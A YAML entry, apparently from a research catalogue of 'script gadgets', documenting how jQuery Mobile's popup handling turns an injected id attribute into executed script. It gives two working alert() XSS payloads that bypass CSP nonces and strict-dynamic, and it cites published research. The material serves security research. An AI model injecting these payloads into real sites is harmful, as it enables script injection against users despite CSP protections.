---
description: jQuery Mobile is a unified, HTML5-based user interface system for all popular mobile device platforms, built on the rock-solid jQuery and jQuery UI foundation. Its lightweight code is built with progressive enhancement, and has a flexible, easily themeable design.
github: jquery-archive/jquery-mobile
gadgets:
  Latest:
    authors:
      - twitter:slekies
      - twitter:kkotowicz
      - twitter:sirdarckcat
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - unsafe-eval-csp
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: |
          The [jQuery Mobile](https://github.com/jquery/jquery-mobile) takes the `data-role="popup"` attribute and takes content of the `id` attribute to insert it into the DOM using `innerHTML`.

          *Because `history.replaceState` doesn't work in an `srcdoc` iframe, the preview isn't available.*
        code: |
          <script nonce="secret" src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
          <script nonce="secret" src="https://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.js"></script>

          <!-- user input -->
          <x data-role="popup" id="--><img src=x onerror=alert()>"></x>
        preview: false
      - description: It is possible to execute JavaScript code directly by injecting a `<script>` tag. Internally, jQuery uses the [domManip](https://github.com/jquery/jquery/blob/b668be0fdc0d369e779840ef57033ea3fe040cb7/src/manipulation/domManip.js#L24) function to handle nodes, which evaluates the content of `<script>` tags (this one won't works without).
        code: |
          <script nonce="secret" src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
          <script nonce="secret" src="https://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.js"></script>

          <!-- user input -->
          <x data-role="popup" id="-->&lt;script&gt;alert(1)&lt;/script&gt;"></x>
        preview: false
    links:
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/ue/jquerymobile.php
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/ue/jquerymobile_exploit.php
      - http://sebastian-lekies.de/slides/appsec2017.pdf
      - https://acmccs.github.io/papers/p1709-lekiesA.pdf
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
---
